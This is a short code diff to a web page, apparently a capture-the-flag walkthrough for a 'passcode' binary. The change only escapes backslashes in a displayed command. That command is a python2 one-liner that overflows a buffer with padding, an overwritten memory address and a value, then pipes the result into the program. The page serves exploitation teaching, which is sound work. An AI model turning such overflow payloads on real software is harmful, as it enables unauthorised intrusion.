@@ -170,7 +170,7 @@ export default function Page() {
                 }} />
                 <SubPara content={'"Now, send the payload to the server and observe the result.'} />
                 <div className="overflow-x-auto">
-                    <Code color="success" className="my-3">{`python2 -c "print('a'*96 + '\x04\xa0\x04\x08' + '134514135')" | ./passcode`}</Code>
+                    <Code color="success" className="my-3">{`python2 -c "print('a'*96 + '\\x04\\xa0\\x04\\x08' + '134514135')" | ./passcode`}</Code>
                 </div>
 
                 <SubImage img={{
